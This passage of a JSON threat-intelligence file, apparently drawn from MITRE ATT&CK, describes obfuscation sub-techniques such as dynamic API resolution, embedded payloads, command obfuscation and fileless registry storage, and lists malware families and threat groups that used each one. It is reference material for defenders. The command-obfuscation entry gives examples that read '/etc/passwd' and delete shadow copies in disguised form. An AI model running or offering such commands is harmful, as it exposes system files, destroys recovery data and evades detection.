can extract an encoded blob from its HTML body and write it to disk."}, {"id": "S0650", "name": "QakBot", "description": "QakBot has been delivered in ZIP files via HTML smuggling."}]}, {"name": "Dynamic API Resolution", "description": "Adversaries may obfuscate then dynamically resolve API functions called by their malware in order to conceal malicious functionalities and impair defensive analysis. Malware commonly uses various Native API functions provided by the OS to perform various tasks such as those involving processes, files, and other system artifacts.", "detailed_description": "Adversaries may obfuscate then dynamically resolve API functions called by their malware in order to conceal malicious functionalities and impair defensive analysis. Malware commonly uses various Native API functions provided by the OS to perform various tasks such as those involving processes, files, and other system artifacts.\nAPI functions called by malware may leave static artifacts such as strings in payload files. Defensive analysts may also uncover which functions a binary file may execute via an import address table (IAT) or other structures that help dynamically link calling code to the shared modules that provide functions.\nTo avoid static or other defensive analysis, adversaries may use dynamic API resolution to conceal malware characteristics and functionalities. Similar to Software Packing, dynamic API resolution may change file signatures and obfuscate malicious API function calls until they are resolved and invoked during runtime.\nVarious methods may be used to obfuscate malware calls to API functions. For example, hashes of function names are commonly stored in malware in lieu of literal strings. Malware can use these hashes (or other identifiers) to manually reproduce the linking and loading process using functions such as GetProcAddress() and LoadLibrary(). These hashes/identifiers can also be further obfuscated using encryption or other string manipulation tricks (requiring various forms of Deobfuscate/Decode Files or Information during execution).", "id": "T1027.007", "examples": [{"id": "S1053", "name": "AvosLocker", "description": "AvosLocker has used obfuscated API calls that are retrieved by their checksums."}, {"id": "S0534", "name": "Bazar", "description": "Bazar can hash then resolve API calls at runtime."}, {"id": "S1063", "name": "Brute Ratel C4", "description": "Brute Ratel C4 can call and dynamically resolve hashed APIs."}, {"id": "S1149", "name": "CHIMNEYSWEEP", "description": "CHIMNEYSWEEP can use LoadLibrary and GetProcAddress to resolve Windows API function strings at run time."}, {"id": "S1160", "name": "Latrodectus", "description": "Latrodectus can resolve Windows APIs dynamically by hash."}, {"id": "G0032", "name": "Lazarus Group", "description": "Lazarus Group has used a custom hashing method to resolve APIs used in shellcode."}, {"id": "S0147", "name": "Pteranodon", "description": "Pteranodon can use a dynamic Windows hashing algorithm to map API components."}, {"id": "S1148", "name": "Raccoon Stealer", "description": "Raccoon Stealer dynamically links key WinApi functions during execution."}, {"id": "S1099", "name": "Samurai", "description": "Samurai can encrypt API name strings with an XOR-based algorithm."}]}, {"name": "Stripped Payloads", "description": "Adversaries may attempt to make a payload difficult to analyze by removing symbols, strings, and other human readable information. Scripts and executables may contain variables names and other strings that help developers document code functionality. Symbols are often created by an operating system\u2019s linker when executable payloads are compiled. Reverse engineers use these symbols and strings to analyze code and to identify functionality in payloads.", "detailed_description": "Adversaries may attempt to make a payload difficult to analyze by removing symbols, strings, and other human readable information. Scripts and executables may contain variables names and other strings that help developers document code functionality. Symbols are often created by an operating system\u2019s linker when executable payloads are compiled. Reverse engineers use these symbols and strings to analyze code and to identify functionality in payloads.\nAdversaries may use stripped payloads in order to make malware analysis more difficult. For example, compilers and other tools may provide features to remove or obfuscate strings and symbols. Adversaries have also used stripped payload formats, such as run-only AppleScripts, a compiled and stripped version of AppleScript, to evade detection and analysis. The lack of human-readable information may directly hinder detection and analysis of payloads.", "id": "T1027.008", "examples": [{"id": "S1153", "name": "Cuckoo Stealer", "description": "Cuckoo Stealer is a stripped binary payload."}, {"id": "S1048", "name": "macOS.OSAMiner", "description": "macOS.OSAMiner has used run-only Applescripts, a compiled and stripped version of AppleScript, to remove human readable indicators to evade detection."}]}, {"name": "Embedded Payloads", "description": "Adversaries may embed payloads within other files to conceal malicious content from defenses. Otherwise seemingly benign files (such as scripts and executables) may be abused to carry and obfuscate malicious payloads and content. In some cases, embedded payloads may also enable adversaries to Subvert Trust Controls by not impacting execution controls such as digital signatures and notarization tickets.", "detailed_description": "Adversaries may embed payloads within other files to conceal malicious content from defenses. Otherwise seemingly benign files (such as scripts and executables) may be abused to carry and obfuscate malicious payloads and content. In some cases, embedded payloads may also enable adversaries to Subvert Trust Controls by not impacting execution controls such as digital signatures and notarization tickets.\nAdversaries may embed payloads in various file formats to hide payloads. This is similar to Steganography, though does not involve weaving malicious content into specific bytes and patterns related to legitimate digital media formats.\nFor example, adversaries have been observed embedding payloads within or as an overlay of an otherwise benign binary. Adversaries have also been observed nesting payloads (such as executables and run-only scripts) inside a file of the same format.\nEmbedded content may also be used as Process Injection payloads used to infect benign system processes. These embedded then injected payloads may be used as part of the modules of malware designed to provide specific features such as encrypting C2 communications in support of an orchestrator module. For example, an embedded module may be injected into default browsers, allowing adversaries to then communicate via the network.", "id": "T1027.009", "examples": [{"id": "S1081", "name": "BADHATCH", "description": "BADHATCH has an embedded second stage DLL payload within the first stage of the malware."}, {"id": "C0021", "name": "C0021", "description": "For C0021, the threat actors embedded a base64-encoded payload within a LNK file."}, {"id": "S1149", "name": "CHIMNEYSWEEP", "description": "CHIMNEYSWEEP can extract RC4 encrypted embedded payloads for privilege escalation."}, {"id": "S0126", "name": "ComRAT", "description": "ComRAT has embedded a XOR encrypted communications module inside the orchestrator module."}, {"id": "S1052", "name": "DEADEYE", "description": "The DEADEYE.EMBED variant of DEADEYE has the ability to embed payloads inside of a compiled binary."}, {"id": "S1134", "name": "DEADWOOD", "description": "DEADWOOD contains an embedded, AES-encrypted payload labeled METADATA that provides configuration information for follow-on execution."}, {"id": "S0567", "name": "Dtrack", "description": "Dtrack has used a dropper that embeds an encrypted payload as extra data."}, {"id": "S1158", "name": "DUSTPAN", "description": "DUSTPAN decrypts and executes an embedded payload."}, {"id": "S1159", "name": "DUSTTRAP", "description": "DUSTTRAP contains additional embedded DLLs and configuration files that are loaded into memory during execution."}, {"id": "S0367", "name": "Emotet", "description": "Emotet has dropped an embedded executable at %Temp%\\setup.exe. Additionally, Emotet may embed entire code into other files."}, {"id": "S0483", "name": "IcedID", "description": "IcedID has embedded malicious functionality in a legitimate DLL file."}, {"id": "S0231", "name": "Invoke-PSImage", "description": "Invoke-PSImage can be used to embed payload data within a new image file."}, {"id": "S1048", "name": "macOS.OSAMiner", "description": "macOS.OSAMiner has embedded Stripped Payloads within another run-only Stripped Payloads."}, {"id": "S1137", "name": "Moneybird", "description": "Moneybird contains a configuration blob embedded in the malware itself."}, {"id": "G1036", "name": "Moonstone Sleet", "description": "Moonstone Sleet embedded payloads in trojanized software for follow-on execution."}, {"id": "S1135", "name": "MultiLayer Wiper", "description": "MultiLayer Wiper contains two binaries in its resources section, MultiList and MultiWip. MultiLayer Wiper drops and executes each of these items when run, then deletes them after execution."}, {"id": "S0457", "name": "Netwalker", "description": "Netwalker's DLL has been embedded within the PowerShell script in hex format."}, {"id": "S1145", "name": "Pikabot", "description": "Pikabot further decrypts information embedded via steganography using AES-CBC with the same 32 bit key as initial XOR operations combined with the first 16 bytes of the encrypted data as an initialization vector. Other Pikabot variants include encrypted, chunked sections of the stage 2 payload in the initial loader .text section before decrypting and assembling these during execution."}, {"id": "S0649", "name": "SMOKEDHAM", "description": "The SMOKEDHAM source code is embedded in the dropper as an encrypted string."}, {"id": "G1037", "name": "TA577", "description": "TA577 has used LNK files to execute embedded DLLs."}, {"id": "S0022", "name": "Uroburos", "description": "The Uroburos Queue file contains embedded executable files along with key material, communication channels, and modes of operation."}]}, {"name": "Command Obfuscation", "description": "Adversaries may obfuscate content during command execution to impede detection. Command-line obfuscation is a method of making strings and patterns within commands and scripts more difficult to signature and analyze. This type of obfuscation can be included within commands executed by delivered payloads (e.g., Phishing and Drive-by Compromise) or interactively via Command and Scripting Interpreter.", "detailed_description": "Adversaries may obfuscate content during command execution to impede detection. Command-line obfuscation is a method of making strings and patterns within commands and scripts more difficult to signature and analyze. This type of obfuscation can be included within commands executed by delivered payloads (e.g., Phishing and Drive-by Compromise) or interactively via Command and Scripting Interpreter.\nFor example, adversaries may abuse syntax that utilizes various symbols and escape characters (such as spacing,  ^, +. $, and %) to make commands difficult to analyze while maintaining the same intended functionality. Many languages support built-in obfuscation in the form of base64 or URL encoding. Adversaries may also manually implement command obfuscation via string splitting (\"Wor\"+\"d.Application\"), order and casing of characters (rev <<<'dwssap/cte/ tac'), globing (mkdir -p '/tmp/:&$NiA'), as well as various tricks involving passing strings through tokens/environment variables/input streams.\nAdversaries may also use tricks such as directory traversals to obfuscate references to the binary being invoked by a command (C:\\voi\\pcw\\..\\..\\Windows\\tei\\qs\\k\\..\\..\\..\\system32\\erool\\..\\wbem\\wg\\je\\..\\..\\wmic.exe shadowcopy delete).\nTools such as Invoke-Obfuscation and Invoke-DOSfucation have also been used to obfuscate commands.", "id": "T1027.010", "examples": [{"id": "G0073", "name": "APT19", "description": "APT19 used Base64 to obfuscate executed commands."}, {"id": "G0050", "name": "APT32", "description": "APT32 has used the Invoke-Obfuscation framework to obfuscate their PowerShell."}, {"id": "G0143", "name": "Aquatic Panda", "description": "Aquatic Panda has encoded PowerShell commands in Base64."}, {"id": "S0373", "name": "Astaroth", "description": "Astaroth has obfuscated and randomized parts of the JScript code it is initiating."}, {"id": "S0475", "name": "BackConfig", "description": "BackConfig has used compressed and decimal encoded VBS scripts."}, {"id": "S1081", "name": "BADHATCH", "description": "BADHATCH malicious PowerShell commands can be encoded with base64."}, {"id": "C0018", "name": "C0018", "description": "During C0018, the threat actors used Base64 to encode their PowerShell scripts."}, {"id": "C0021", "name": "C0021", "description": "During C0021, the threat actors used encoded PowerShell commands."}, {"id": "S0462", "name": "CARROTBAT", "description": "CARROTBAT has the ability to execute obfuscated commands on the infected host."}, {"id": "G0114", "name": "Chimera", "description": "Chimera has encoded PowerShell commands."}, {"id": "G0080", "name": "Cobalt Group", "description": "Cobalt Group obfuscated several scriptlets and code used on the victim\u2019s machine, including through use of XOR and RC4."}, {"id": "S0126", "name": "ComRAT", "description": "ComRAT has used encryption and base64 to obfuscate its orchestrator code in the Registry. ComRAT has also used encoded PowerShell scripts."}, {"id": "S0492", "name": "CookieMiner", "description": "CookieMiner has used base64 encoding to obfuscate scripts on the system."}, {"id": "S0673", "name": "DarkWatchman", "description": "DarkWatchman has used Base64 to encode PowerShell commands."}, {"id": "S0354", "name": "Denis", "description": "Denis has encoded its PowerShell commands in Base64."}, {"id": "S0367", "name": "Emotet", "description": "Emotet has obfuscated macros within malicious documents to hide the URLs hosting the malware,  CMD.exe arguments, and PowerShell scripts. "}, {"id": "S0363", "name": "Empire", "description": "Empire has the ability to obfuscate commands using Invoke-Obfuscation."}, {"id": "G0037", "name": "FIN6", "description": "FIN6 has used encoded PowerShell commands."}, {"id": "G0046", "name": "FIN7", "description": "FIN7 has used fragmented strings, environment variables, standard input (stdin), and native character-replacement functionalities to obfuscate commands."}, {"id": "G0061", "name": "FIN8", "description": "FIN8 has used environment variables and standard input (stdin) to obfuscate command-line arguments. FIN8 also obfuscates malicious macros delivered as payloads."}, {"id": "G0117", "name": "Fox Kitten", "description": "Fox Kitten has base64 encoded scripts to avoid detection."}, {"id": "C0001", "name": "Frankenstein", "description": "During Frankenstein, the threat actors ran encoded commands from the command line."}, {"id": "S0277", "name": "FruitFly", "description": "FruitFly executes and stores obfuscated Perl scripts."}, {"id": "G0047", "name": "Gamaredon Group", "description": "Gamaredon Group has used obfuscated or encrypted scripts."}, {"id": "G0115", "name": "GOLD SOUTHFIELD", "description": "GOLD SOUTHFIELD has executed base64 encoded PowerShell scripts on compromised hosts."}, {"id": "G1001", "name": "HEXANE", "description": "HEXANE has used Base64-encoded scripts."}, {"id": "S1022", "name": "IceApple", "description": "IceApple can use Base64 and \"junk\" JavaScript code to obfuscate information."}, {"id": "S0669", "name": "KOCTOPUS", "description": "KOCTOPUS has obfuscated scripts with the BatchEncryption tool."}, {"id": "G0140", "name": "LazyScripter", "description": "LazyScripter has leveraged the BatchEncryption tool to perform advanced batch script obfuscation and encoding techniques."}, {"id": "G0077", "name": "Leafminer", "description": "Leafminer obfuscated scripts that were used on victim machines."}, {"id": "S0451", "name": "LoudMiner", "description": "LoudMiner has obfuscated various scripts."}, {"id": "S0409", "name": "Machete", "description": "Machete has used pyobfuscate, zlib compression, and base64 encoding for obfuscation. Machete has also used some visual obfuscation techniques by naming variables as combinations of letters to hinder analysis."}, {"id": "G0059", "name": "Magic Hound", "description": "Magic Hound has used base64-encoded commands."}, {"id": "G0069", "name": "MuddyWater", "description": "MuddyWater has used Daniel Bohannon\u2019s Invoke-Obfuscation framework and obfuscated PowerShell scripts. The group has also used other obfuscation methods, including Base64 obfuscation of VBScripts and PowerShell commands."}, {"id": "S0457", "name": "Netwalker", "description": "Netwalker's PowerShell script has been obfuscated with multiple layers including base64 and hexadecimal encoding and XOR-encryption, as well as obfuscated PowerShell functions and variables."}, {"id": "C0012", "name": "Operation CuckooBees", "description": "During Operation CuckooBees, the threat actors executed an encoded VBScript file."}, {"id": "C0014", "name": "Operation Wocao", "description": "During Operation Wocao, threat actors executed PowerShell commands which were encoded or compressed using Base64, zlib, and XOR."}, {"id": "G0040", "name": "Patchwork", "description": "Patchwork has obfuscated a script with Crypto Obfuscator."}, {"id": "G1040", "name": "Play", "description": "Play has used Base64-encoded PowerShell scripts for post exploit activities on compromised hosts."}, {"id": "S0428", "name": "PoetRAT", "description": "PoetRAT has pyminifier to obfuscate scripts."}, {"id": "S0685", "name": "PowerPunch", "description": "PowerPunch can use Base64-encoded scripts."}, {"id": "S0194", "name": "PowerSploit", "description": "PowerSploit contains a collection of ScriptModification modules that compress and encode scripts and payloads."}, {"id": "S0223", "name": "POWERSTATS", "description": "POWERSTATS uses character replacement, PowerShell environment variables, and XOR encoding to obfuscate code. POWERSTATS's backdoor code is a multi-layer obfuscated, encoded, and compressed blob.  POWERSTATS has used PowerShell code with custom string obfuscation "}, {"id": "S0650", "name": "QakBot", "description": "QakBot can use obfuscated and encoded scripts."}, {"id": "S0269", "name": "QUADAGENT", "description": "QUADAGENT was likely obfuscated using Invoke-Obfuscation."}, {"id": "S0270", "name": "RogueRobin", "description": "The PowerShell script with the RogueRobin payload was obfuscated using the COMPRESS technique in Invoke-Obfuscation."}, {"id": "G0034", "name": "Sandworm Team", "description": "Sandworm Team has used ROT13 encoding, AES encryption and compression with the zlib library for their Python-based backdoor."}, {"id": "S1085", "name": "Sardonic", "description": "Sardonic PowerShell scripts can be encrypted with RC4 and compressed using Gzip."}, {"id": "S0450", "name": "SHARPSTATS", "description": "SHARPSTATS has used base64 encoding and XOR to obfuscate PowerShell scripts."}, {"id": "S0589", "name": "Sibot", "description": "Sibot has obfuscated scripts used in execution."}, {"id": "G0121", "name": "Sidewinder", "description": "Sidewinder has used base64 encoding for scripts."}, {"id": "G0091", "name": "Silence", "description": "Silence has used environment variable string substitution for obfuscation."}, {"id": "S0390", "name": "SQLRat", "description": "SQLRat has used a character insertion obfuscation technique, making the script appear to contain Chinese characters."}, {"id": "G0092", "name": "TA505", "description": "TA505 has used base64 encoded PowerShell commands."}, {"id": "G0127", "name": "TA551", "description": "TA551 has used obfuscated variable names in a JavaScript configuration file."}, {"id": "G0010", "name": "Turla", "description": "Turla has used encryption (including salted 3DES via PowerSploit's Out-EncryptedScript.ps1), random variable names, and base64 encoding to obfuscate PowerShell commands and payloads."}, {"id": "S0386", "name": "Ursnif", "description": "Ursnif droppers execute base64 encoded PowerShell commands."}, {"id": "G0102", "name": "Wizard Spider", "description": "Wizard Spider used Base64 encoding to obfuscate an Empire service and PowerShell commands."}, {"id": "S0330", "name": "Zeus Panda", "description": "Zeus Panda obfuscates the macro commands in its initial payload."}]}, {"name": "Fileless Storage", "description": "Adversaries may store data in \"fileless\" formats to conceal malicious activity from defenses. Fileless storage can be broadly defined as any format other than a file. Common examples of non-volatile fileless storage in Windows systems include the Windows Registry, event logs, or WMI repository. In Linux systems, shared memory directories such as /dev/shm, /run/shm, /var/run, and /var/lock may also be considered fileless storage, as files written to these directories are mapped directly to RAM and not stored on the disk.", "detailed_description": "Adversaries may store data in \"fileless\" formats to conceal malicious activity from defenses. Fileless storage can be broadly defined as any format other than a file. Common examples of non-volatile fileless storage in Windows systems include the Windows Registry, event logs, or WMI repository. In Linux systems, shared memory directories such as /dev/shm, /run/shm, /var/run, and /var/lock may also be considered fileless storage, as files written to these directories are mapped directly to RAM and not stored on the disk.\nSimilar to fileless in-memory behaviors such as Reflective Code Loading and Process Injection, fileless data storage may remain undetected by anti-virus and other endpoint security tools that can only access specific file formats from disk storage. Leveraging fileless storage may also allow adversaries to bypass the protections offered by read-only file systems in Linux.\nAdversaries may use fileless storage to conceal various types of stored data, including payloads/shellcode (potentially being used as part of Persistence) and collected data not yet exfiltrated from the victim (e.g., Local Data Staging). Adversaries also often encrypt, encode, splice, or otherwise obfuscate this fileless data when stored.\nSome forms of fileless storage activity may indirectly create artifacts in the file system, but in central and otherwise difficult to inspect formats such as the WMI (e.g., %SystemRoot%\\System32\\Wbem\\Repository) or Registry (e.g., %SystemRoot%\\System32\\Config) physical files.", "id": "T1027.011", "examples": [{"id": "G0050", "name": "APT32", "description": "APT32's backdoor has stored its configuration in a registry key."}, {"id": "S0631", "name": "Chaes", "description": "Some versions of Chaes stored its instructions (otherwise in a instructions.ini file) in the Registry."}, {"id": "S0023", "name": "CHOPSTICK", "description": "CHOPSTICK may store RC4 encrypted configuration information in the Windows Registry."}, {"id": "S0126", "name": "ComRAT", "description": "ComRAT has stored encrypted orchestrator code and payloads in the Registry."}, {"id": "S0673", "name": "DarkWatchman", "description": "DarkWatchman can store configuration strings, keylogger, and output of components in the Registry."}, {"id": "S0343", "name": "Exaramel for Windows", "description": "Exaramel for Windows stores the backdoor's configuration in the Registry in XML format."}, {"id": "S0666", "name": "Gelsemium", "description": "Gelsemium can store its components in the Registry."}, {"id": "S0531", "name": "Grandoreiro", "description": "Grandoreiro can store its configuration in the Registry at HKCU\\Software\\ under frequently changing names including %USERNAME% and ToolTech-RM."}, {"id": "S0256", "name": "Mosquito", "description": "Mosquito stores configuration values under the Registry key HKCU\\Software\\Microsoft[dllname]."}, {"id": "S0198", "name": "NETWIRE", "description": "NETWIRE can store its configuration information in the Registry under HKCU:\\Software\\Netwire."}, {"id": "C0012", "name": "Operation CuckooBees", "description": "During Operation CuckooBees, the threat actors stroed payloads in Windows CLFS (Common Log File System) transactional logs."}, {"id": "S1145", "name": "Pikabot", "description": "Some versions of Pikabot build the final PE payload in memory to avoid writing contents to disk on the executing machine."}, {"id": "S0517", "name": "Pillowmint", "description": "Pillowmint has stored a compressed payload in the Registry key HKLM\\SOFTWARE\\Microsoft\\DRM."}, {"id": "S0501", "name": "PipeMon", "description": "PipeMon has stored its encrypted payload in the Registry under HKLM\\SOFTWARE\\Microsoft\\Print\\Components\\."}, {"id": "S0518", "name": "PolyglotDuke", "description": "PolyglotDuke can store encrypted JSON configuration files in the Registry."}, {"id": "S0650", "name": "QakBot", "description": "QakBot can store its configuration information in a randomly named subkey under HKCU\\Software\\Microsoft."}, {"id": "S0269", "name": "QUADAGENT", "description": "QUADAGENT stores a session identifier unique to the compromised system as well as a pre-shared key used for encrypting and decrypting C2 communications within a Registry key (such as HKCU\\Office365DCOMCheck) in the HKCU hive."}, {"id": "S0662", "name": "RCSession", "description": "RCSession can store its obfuscated configuration file in the Registry under HKLM\\SOFTWARE\\Plus or HKCU\\SOFTWARE\\Plus."}, {"id": "S0511", "name": "RegDuke", "description": "RegDuke can store its encryption key in the Registry."}, {"id": "S0496", "name": "REvil", "description": "REvil can save encryption parameters and system information in the Registry."}, {"id": "S0596", "name": "ShadowPad", "description": "ShadowPad maintains a configuration block and virtual file system in the Registry."}, {"id": "S0589", "name": "Sibot", "description": "Sibot has installed a second-stage script in the HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\sibot registry key."}, {"id": "S0663", "name": "SysUpdate", "description": "SysUpdate can store its encoded configuration file within Software\\Classes\\scConfig in either HKEY_LOCAL_MACHINE or HKEY_CURRENT_USER."}, {"id": "S0665", "name": "ThreatNeedle", "description": "ThreatNeedle can save its configuration data as a RC4-encrypted Registry key under HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\GameCon."}, {"id": "S0668", "name": "TinyTurla", "description": "TinyTurla can save its configuration parameters in the Registry."}, {"id": "G0010", "name": "Turla", "description": "Turla has used the Registry to store encrypted and encoded payloads."}, {"id": "S0263", "name": "TYPEFRAME", "description": "TYPEFRAME can install and store encrypted configuration data under the Registry key HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\ShellCompatibility\\Applications\\laxhost.dll and HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\PrintConfigs."}, {"id": "S0022", "name": "Uroburos", "description": "Uroburos can store configuration information for the kernel driver and kernel driver loader components in an encrypted blob typically found at HKLM:\\SOFTWARE\\Classes\\.wav\\OpenWithProgIds."}, {"id": "S0476", "name": "Valak", "description": "Valak has the ability to store information regarding the C2 server and downloads in the Registry key HKCU\\Software\\ApplicationContainer\\Appsw64."}, {"id": "S0180", "name": "Volgmer", "description": "Volgmer stores an encoded configuration file in HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Security."}]}, {"name": "LNK Icon Smuggling", "description": "Adversaries may smuggle commands to download malicious payloads past content filters by hiding them within otherwise seemingly benign windows shortcut files. Windows shortcut files (.LNK) include many metadata fields, including an icon location field (also known as the IconEnvironmentDataBlock) designed to specify the path to an icon file that is to be displayed for the LNK file within a host directory.", "detailed_description": "Adversaries may smuggle commands to download malicious payloads past content filters by hiding them within otherwise seemingly benign windows shortcut files. Windows shortcut files (.LNK) include many metadata fields, including an icon location field (also known as the IconEnvironmentDataBlock) designed to specify the path to an icon file that is to be displayed for the LNK file within a host directory.\nAdversaries may abuse this LNK metadata to download malicious payloads. For example, adversaries have been observed using LNK files as phishing payloads to deliver malware. Once invoked (e.g., Malicious File), payloads referenced via external URLs within the LNK icon location field may be downloaded. These files may also then be invoked by Command and Scripting Interpreter/System Binary Proxy Execution arguments within the target path field of the LNK.\nLNK Icon Smuggling may also be utilized post compromise, such as malicious scripts executing an LNK on an infected host to download additional malicious payloads.", "id": "T1027.012", "examples": []}, {"name": "Encrypted/Encoded File", "description": "Adversaries may encrypt or encode files to obfuscate strings, bytes, and other specific patterns to impede detection. Encrypting and/or encoding file content aims to conceal malicious artifacts within a file used in an intrusion. Many other techniques, such as Software Packing, Steganography, and Embedded Payloads, share this same broad objective. Encrypting and/or encoding files could lead to a lapse in detection of static signatures, only for this malicious content to be revealed (i.e., Deobfuscate/Decode Files or Information) at the time of execution/use.", "detailed_description": "Adversaries may encrypt or encode files to obfuscate strings, bytes, and other specific patterns to impede detection. Encrypting and/or encoding file content aims to conceal malicious artifacts within a file used in an intrusion. Many other techniques, such as Software Packing, Steganography, and Embedded Payloads, share this same broad objective. Encrypting and/or encoding files could lead to a lapse in detection of static signatures, only for this malicious content to be revealed (i.e., Deobfuscate/Decode Files or Information) at the time of execution/use.\nThis type of file obfuscation can be applied to many file artifacts present on victim hosts, such as malware log/configuration and payload files. Files can be encrypted with a hardcoded or user-supplied key, as well as otherwise obfuscated using standard encoding/compression schemes such as Base64.\nThe entire content of a file may be obfuscated, or just specific functions or values (such as C2 addresses). Encryption and encoding may also be applied in redundant layers for additional protection.\nFor example, adversaries may abuse password-protected Word documents or self-extracting (SFX) archives as a method of encrypting/encoding a file such as a Phishing payload. These files typically function by attaching the intended archived content to a decompressor stub that is executed when the file is invoked (e.g., User Execution).\nAdversaries may also abuse file-specific as well as custom encoding schemes. For example, Byte Order Mark (BOM) headers in text files may be abused to manipulate and obfuscate file content until Command and Scripting Interpreter execution.", "id": "T1027.013", "examples": [{"id": "G0026", "name": "APT18", "description": "APT18 obfuscates strings in the payload."}, {"id": "G0073", "name": "APT19", "description": "APT19 used Base64 to obfuscate payloads."}, {"id": "G0007", "name": "APT28", "description": "APT28 encrypted a .dll payload using RTL and a custom encryption algorithm. APT28 has also obfuscated payloads with base64, XOR, and RC4."}, {"id": "G0050", "name": "APT32", "description": "APT32 has performed code obfuscation, including encoding payloads using Base64 and using a framework called \"Dont-Kill-My-Cat (DKMC). APT32 also encrypts the library used for network exfiltration with AES-256 in CBC mode in their macOS backdoor."}, {"id": "G0064", "name": "APT33", "description": "APT33 has used base64 to encode payloads."}, {"id": "G0087", "name": "APT39", "description": "APT39 has used malware to drop encrypted CAB files."}, {"id": "C0040", "name": "APT41 DUST", "description": "APT41 DUST used encrypted payloads decrypted and executed in memory."}, {"id": "S0456", "name": "Aria-body", "description": "Aria-body has used an encrypted configuration file for its loader."}, {"id": "S0373", "name": "Astaroth", "description": "Astaroth has used an XOR-based algorithm to encrypt payloads twice with different keys."}, {"id": "S0438", "name": "Attor", "description": "Strings in Attor's components are encrypted with a XOR cipher, using a hardcoded key and the configuration data, log files and plugins are encrypted using a hybrid encryption scheme of Blowfish-OFB combined with RSA."}, {"id": "S0347", "name": "AuditCred", "description": "AuditCred encrypts the configuration."}, {"id": "S0473", "name": "Avenger", "description": "Avenger has the ability to XOR encrypt files to be sent to C2."}, {"id": "S1081", "name": "BADHATCH", "description": "BADHATCH can be compressed with the ApLib algorithm."}, {"id": "S0534", "name": "Bazar", "description": "Bazar has used XOR, RSA2, and RC4 encrypted files."}, {"id": "S0574", "name": "BendyBear", "description": "BendyBear has encrypted payloads using RC4 and XOR."}, {"id": "S0268", "name": "Bisonal", "description": "Bisonal's DLL file and non-malicious decoy file are encrypted with RC4 and some function name strings are obfuscated."}, {"id": "S0570", "name": "BitPaymer", "description": "BitPaymer has used RC4-encrypted strings and string hashes to avoid identifiable strings within the binary."}, {"id": "G1002", "name": "BITTER", "description": "BITTER has used a RAR SFX dropper to deliver malware."}, {"id": "S0520", "name": "BLINDINGCAN", "description": "BLINDINGCAN has obfuscated code using Base64 encoding."}, {"id": "G0108", "name": "Blue Mockingbird", "description": "Blue Mockingbird has obfuscated the wallet address in the payload binary."}, {"id": "S0657", "name": "BLUELIGHT", "description": "BLUELIGHT has a XOR-encoded payload."}, {"id": "S0415", "name": "BOOSTWRITE", "description": "BOOSTWRITE has encoded its payloads using a ChaCha stream cipher with a 256-bit key and 64-bit Initialization vector (IV) to evade detection."}, {"id": "S0484", "name": "Carberp", "description": "Carberp has used XOR-based encryption to mask C2 server locations within the trojan."}, {"id": "S0348", "name": "Cardinal RAT", "description": "Cardinal RAT encodes many of its artifacts and is encrypted (AES-128) when downloaded."}, {"id": "S0462", "name": "CARROTBAT", "description": "CARROTBAT has the ability to download a base64 encoded payload."}, {"id": "S1041", "name": "Chinoxy", "description": "Chinoxy has encrypted its configuration file."}, {"id": "S0667", "name": "Chrommme", "description": "Chrommme can encrypt sections of its code to evade detection."}, {"id": "S0046", "name": "CozyCar", "description": "The payload of CozyCar is encrypted with simple XOR with a rotating key. The CozyCar configuration file has been encrypted with RC4 keys."}, {"id": "S1153", "name": "Cuckoo Stealer", "description": "Cuckoo Stealer strings are XOR-encrypted."}, {"id": "C0029", "name": "Cutting Edge", "description": "During Cutting Edge, threat actors used a Base64-encoded Python script to write a patched version of the Ivanti Connect Secure dsls binary."}, {"id": "S0497", "name": "Dacls", "description": "Dacls can encrypt its configuration file with AES CBC."}, {"id": "S1014", "name": "DanBot", "description": "DanBot can Base64 encode its payload."}, {"id": "G0070", "name": "Dark Caracal", "description": "Dark Caracal has obfuscated strings in Bandook by base64 encoding, and then encrypting them."}, {"id": "S1111", "name": "DarkGate", "description": "DarkGate drops an encrypted PE file, pe.bin, and decrypts it during installation. DarkGate also uses custom base64 encoding schemas in later variations to obfuscate payloads."}, {"id": "G0012", "name": "Darkhotel", "description": "Darkhotel has obfuscated code using RC4, XOR, and RSA."}, {"id": "S0673", "name": "DarkWatchman", "description": "DarkWatchman has been delivered as compressed RAR payloads in ZIP files to victims."}, {"id": "S1033", "name": "DCSrv", "description": "DCSrv's configuration is encrypted."}, {"id": "S1052", "name": "DEADEYE", "description": "DEADEYE has encrypted its payload."}, {"id": "S1134", "name": "DEADWOOD", "description": "DEADWOOD contains an embedded, AES-encrypted resource named METADATA that contains configuration information for follow-on execution."}, {"id": "S0213", "name": "DOGCALL", "description": "DOGCALL is encrypted using single-byte XOR."}, {"id": "S1158", "name": "DUSTPAN", "description": "DUSTPAN decrypts an embedded payload."}, {"id": "S1159", "name": "DUSTTRAP", "description": "DUSTTRAP begins with an initial launcher that decrypts an AES-128-CFB encrypted file on disk and executes it in memory."}, {"id": "G0066", "name": "Elderwood", "description": "Elderwood has encrypted documents and malicious executables."}, {"id": "S0081", "name": "Elise", "description": "Elise encrypts several of its files, including configuration files."}, {"id": "S0082", "name": "Emissary", "description": "Variants of Emissary encrypt payloads using various XOR ciphers, as well as a custom algorithm that uses the \"srand\" and \"rand\" functions."}, {"id": "S0367", "name": "Emotet", "description": "Emotet uses obfuscated URLs to download a ZIP file."}, {"id": "S0634", "name": "EnvyScout", "description": "EnvyScout can Base64 encode payloads."}, {"id": "S0401", "name": "Exaramel for Linux", "description": "Exaramel for Linux uses RC4 for encrypting the configuration."}, {"id": "S0267", "name": "FELIXROOT", "description": "FELIXROOT encrypts strings in the backdoor using a custom XOR algorithm."}, {"id": "S0618", "name": "FIVEHANDS", "description": "The FIVEHANDS payload is encrypted with AES-128."}, {"id": "S0383", "name": "FlawedGrace", "description": "FlawedGrace encrypts its C2 configuration files with AES in CBC mode."}, {"id": "S0661", "name": "FoggyWeb", "description": "FoggyWeb has been XOR-encoded."}, {"id": "G0117", "name": "Fox Kitten", "description": "Fox Kitten has base64 encoded payloads to avoid detection."}, {"id": "S1044", "name": "FunnyDream", "description": "FunnyDream can Base64 encode its C2 address stored in a template binary with the xyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvw_- 